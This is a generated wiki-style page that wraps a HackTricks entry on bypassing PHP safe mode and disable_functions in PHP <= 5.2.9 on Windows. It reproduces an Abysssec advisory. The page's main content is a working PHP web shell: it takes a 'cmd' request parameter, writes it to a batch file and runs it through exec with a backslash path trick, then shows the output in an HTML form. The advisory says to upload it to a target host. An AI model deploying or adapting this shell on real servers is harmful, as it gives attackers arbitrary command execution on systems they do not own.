---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# PHP &lt;= 5.2.9 on windows

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-php-tricks-esp-php-useful-functions-disable-functions-open-basedir-bypass-disable-functions-bypass-php-less-than-5.2.9-on-windows` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-less-than-5.2.9-on-windows.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PHP &lt;= 5.2.9 on windows](../../topics/network-services-pentesting/php-andlt-5.2.9-on-windows.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-php-tricks-esp-php-useful-functions-disable-functions-open-basedir-bypass-disable-functions-bypass-php-less-than-5.2.9-on-windows |
| name | PHP &lt;= 5.2.9 on windows |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-less-than-5.2.9-on-windows.md |

## Preserved Source Material

````yaml
_body: "# PHP &lt;= 5.2.9 on windows\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\
  \n{{#tabs}}\n{{#tab name=\"exploit.php\"}}\n\n```php\n<?php\n//cmd.php\n/*\n\tAbysssec Inc Public Advisory\n\n\tHere is\
  \ another safemod bypass vulnerability exist in php <= 5.2.9 on windows .\n\tthe problem comes from OS behavior - implement\
  \  and interfacing between php\n\tand operation systems directory structure . the problem is php won't tell difference\n\
  \tbetween directory browsing in linux and windows this can lead attacker to ability\n\texecute his / her commands on targert\
  \ machie even in SafeMod On  (php.ini setting) .\n\t=============================================================================\n\
  \tin linux when you want open a directory for example php directory you need\n\tto go to /usr/bin/php and you can't use\
  \ \\usr\\bin\\php . but windows won't tell\n\tdiffence between slash and back slash it means there is no didffrence  between\n\
  \tc:\\php and c:/php , and this is not vulnerability but itself but  because of this  simple\n\tphp implement \"\\\" character\
  \ can escape safemode using  function like excec .\n\there is a PoC for discussed vulnerability . just upload files on your\
  \ target host and execute\n\tyour commands .\n\t==============================================================================\n\
  \tnote : this vulnerabities is just for educational purpose and author will be not be responsible\n\tfor any damage using\
  \ this vulnerabilty.\n\t==============================================================================\n\tfor more information\
  \ visit Abysssec.com\n\tfeel free to contact me at admin [at] abysssec.com\n*/\n\t$cmd = $_REQUEST['cmd'];\n\tif ($cmd){\n\
  \t$batch = fopen (\"cmd.bat\",\"w\");\n\tfwrite($batch,\"$cmd>abysssec.txt\".\"\\r\\n\");\n\tfwrite($batch,\"exit\");\n\t\
  fclose($batch);\n\texec(\"\\start cmd.bat\");\n\techo \"<center>\";\n\techo \"<h1>Abysssec.com PHP <= 5.2.9 SafeMod Bypasser</h1>\"\
  ;\n\techo \"<textarea rows=20 cols=60>\";\n\trequire(\"abysssec.txt\");\n\techo \"</textarea>\";\n\techo \"</center>\";\n\
  \t}\n?>\n\n<html>\n<body bgcolor=#000000 and text=#DO0000>\n<center>\n<form method=post>\n<input type=text name=cmd >\n\
  <input type=submit value=bypass>\n</form>\n</center>\n</body>\n</html>\n```\n\n{{#endtab}}\n\n{{#tab name=\"cmd.bat\"}}\n\
  \n```\ndir > abyss.txt\nexit\n```\n\n{{#endtab}}\n{{#endtabs}}\n\n{{#include ../../../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-less-than-5.2.9-on-windows.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-less-than-5.2.9-on-windows.md
````
